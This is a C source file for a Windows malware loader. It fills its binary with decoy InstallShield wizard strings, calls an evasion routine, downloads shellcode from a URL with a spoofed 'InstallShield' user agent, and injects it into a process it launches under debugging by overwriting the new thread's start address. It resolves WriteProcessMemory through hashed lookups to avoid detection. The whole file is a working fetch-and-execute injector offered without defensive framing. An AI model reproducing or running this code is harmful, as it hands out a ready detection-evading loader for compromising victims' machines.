#include <stdio.h>
#include "Evasion.h"
#include "ProcessHypnosisStagedObfuscated.h"

const unsigned char a1[] = "InstallShield Setup is preparing the InstallShield Wizard which will guide you through the program setup process. Please wait.";
const unsigned char a2[] = "Next";
const unsigned char a3[] = "Back";
const unsigned char a4[] = "Finish";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "Extracting %s";
const unsigned char a8[] = "WARNING: This program is protected by copyright law and international treaties.";
const unsigned char a9[] = "The InstallShield(R) Wizard will install %s on your computer. To continue, click Next.";
const unsigned char a0[] = "I accept the terms in the license agreement";
const unsigned char a11[] = "I do not accept the terms in the license agreement";
const unsigned char a12[] = "Back";
const unsigned char a13[] = "Change...";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;
	HINTERNET	hInternet = NULL,
				hInternetFile = NULL;
	DWORD		dwBytesRead = NULL;
	SIZE_T		sSize = NULL; 	 			// Used as the total payload size
	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
				pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	hInternet = InternetOpenW(L"InstallShield", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

int main() {
	
	//Evasion 
	InitEvasion();
	
	STARTUPINFOW			StartupInfo = { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo = { 0 };
	WCHAR				    szTargetProcess[MAX_PATH] = TARGET_PROCESS_PATH;
	DEBUG_EVENT			    DebugEvent = { 0 };
	SIZE_T				    sNumberOfBytesWritten = 0x00;

	SIZE_T					shellcodeSize = NULL;
	PBYTE					shellcode = NULL;

	if (!CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		return -1;
	}

	if (!GetPayloadFromUrl(PAYLOAD, &shellcode, &shellcodeSize)) {
		return -2;
	}

	fnWriteProcessMemory pWriteProcessMemory;
	pWriteProcessMemory = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_WRITEPROCESSMEMORY);

	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {
		switch (DebugEvent.dwDebugEventCode) {
		case CREATE_THREAD_DEBUG_EVENT: {
			if (!pWriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, shellcode, shellcodeSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != shellcodeSize) {
				return -3;
			}
			if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
				return -4;
			}
			ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
			goto _END_OF_FUNC;
		};

		case EXIT_PROCESS_DEBUG_EVENT:
			return 0;

		default:
			break;
		}
		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}

_END_OF_FUNC:
	HeapFree(GetProcessHeap(), 0, shellcode);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	return 0;
}
